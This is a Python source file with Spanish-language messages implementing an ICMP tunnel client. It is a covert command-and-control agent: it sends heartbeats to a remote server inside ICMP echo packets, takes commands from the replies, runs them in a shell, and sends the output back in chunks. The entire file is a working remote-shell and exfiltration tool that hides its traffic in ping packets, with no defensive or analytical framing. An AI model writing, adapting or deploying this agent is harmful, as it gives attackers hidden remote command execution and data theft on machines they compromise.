import socket
import struct
import subprocess
import sys
import time
import os

CLIENT_MAGIC      = 0xCAFE
SERVER_MAGIC      = 0xBEEF
HEARTBEAT_PAYLOAD = b"HB:"      # HB:<client_id>
MSG_OK            = b"OK"
MSG_CMD           = b"CMD:"
MSG_RESULT        = b"RESULT:"  # RESULT:<client_id>:<data>

HEARTBEAT_INTERVAL = 5
RESULT_CHUNK_SIZE  = 800
SOCKET_TIMEOUT     = 6


class ICMPCommandClient:
    def __init__(self, server_ip: str, client_id: str):
        self.server_ip = server_ip
        self.client_id = client_id
        self.sock      = None
        self.running   = False
        self._seq      = 1

    def _open_socket(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            return True
        except PermissionError:
            print("[ERROR] Se necesitan permisos de root / CAP_NET_RAW")
            return False
        except Exception as e:
            print(f"[ERROR] {e}")
            return False

    @staticmethod
    def _checksum(data: bytes) -> int:
        s, i = 0, 0
        while i < len(data) - 1:
            s += (data[i + 1] << 8) + data[i]
            i += 2
        if len(data) & 1:
            s += data[-1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_request(self, payload: bytes) -> bytes:
        seq = self._seq
        self._seq += 1
        hdr = struct.pack("!BBHHH", 8, 0, 0, CLIENT_MAGIC, seq)
        ck  = self._checksum(hdr + payload)
        return struct.pack("!BBHHH", 8, 0, ck, CLIENT_MAGIC, seq) + payload

    def _send(self, payload: bytes):
        self.sock.sendto(self._build_request(payload), (self.server_ip, 0))

    def _recv_reply(self, timeout: float = SOCKET_TIMEOUT):
        self.sock.settimeout(timeout)
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return None
            self.sock.settimeout(remaining)
            try:
                pkt, _ = self.sock.recvfrom(65535)
                payload = self._parse_reply(pkt)
                if payload is not None:
                    return payload
            except socket.timeout:
                return None

    @staticmethod
    def _parse_reply(packet: bytes):
        ip_hlen = (packet[0] & 0x0F) * 4
        icmp = packet[ip_hlen:]
        if len(icmp) < 8:
            return None
        t, _, _, pid, _ = struct.unpack("!BBHHH", icmp[:8])
        if t != 0 or pid != SERVER_MAGIC:
            return None
        return icmp[8:]

    def _execute(self, command: str) -> str:
        try:
            r = subprocess.run(
                command, shell=True,
                capture_output=True, text=True, timeout=30,
            )
            out = r.stdout or ""
            err = r.stderr or ""
            combined = out + (f"\n[stderr]\n{err}" if err.strip() else "")
            return combined.strip() or "(sin salida)"
        except subprocess.TimeoutExpired:
            return "[ERROR] timeout (30s)"
        except Exception as e:
            return f"[ERROR] {e}"

    def _send_result(self, result: str):
        """Envía el resultado fragmentado con client_id embebido."""
        data   = result.encode("utf-8")
        chunks = [data[i:i + RESULT_CHUNK_SIZE]
                  for i in range(0, len(data), RESULT_CHUNK_SIZE)] or [b"(sin salida)"]

        total = len(chunks)
        id_prefix = self.client_id.encode() + b":"

        for idx, chunk in enumerate(chunks, 1):
            payload = MSG_RESULT + id_prefix + chunk
            self._send(payload)
            print(f"  [↑ fragmento {idx}/{total}]")
            ack = self._recv_reply(timeout=8)
            if ack is None:
                self._send(payload)   # reintento único
                self._recv_reply(timeout=8)
            time.sleep(0.05)

    def start(self):
        if not self._open_socket():
            return

        self.running = True
        hb_payload   = HEARTBEAT_PAYLOAD + self.client_id.encode()

        print("=" * 45)
        print("  Cliente ICMP Tunnel")
        print("=" * 45)
        print(f"Servidor  : {self.server_ip}")
        print(f"Client ID : {self.client_id}")
        print(f"Heartbeat : cada {HEARTBEAT_INTERVAL} s\n")

        last_hb = 0.0

        try:
            while self.running:
                now = time.monotonic()
                if now - last_hb < HEARTBEAT_INTERVAL:
                    time.sleep(0.2)
                    continue

                last_hb = time.monotonic()
                self._send(hb_payload)
                print(".", end="", flush=True)

                reply = self._recv_reply()

                if reply is None:
                    print("\n[!] Sin respuesta del servidor")
                    continue

                if reply == MSG_OK:
                    continue

                if reply.startswith(MSG_CMD):
                    cmd = reply[len(MSG_CMD):].decode("utf-8", errors="replace").strip()
                    print(f"\n[← CMD] {cmd}")
                    output = self._execute(cmd)
                    print(f"[SALIDA]\n{output}\n")
                    self._send_result(output)
                    print("[✓] Resultado enviado\n")
                    last_hb = 0.0   # siguiente HB inmediato

        except KeyboardInterrupt:
            print("\nCliente detenido.")
        finally:
            self.running = False
            self.sock.close()


if __name__ == "__main__":
    server_ip = os.environ.get("SERVER_IP") or (sys.argv[1] if len(sys.argv) > 1 else None)
    client_id = os.environ.get("CLIENT_ID") or (sys.argv[2] if len(sys.argv) > 2 else None)

    if not server_ip or not client_id:
        print("Uso: SERVER_IP=<ip> CLIENT_ID=<id> python3 cliente_icmp.py")
        print("  o: python3 cliente_icmp.py <server_ip> <client_id>")
        sys.exit(1)

    ICMPCommandClient(server_ip, client_id).start()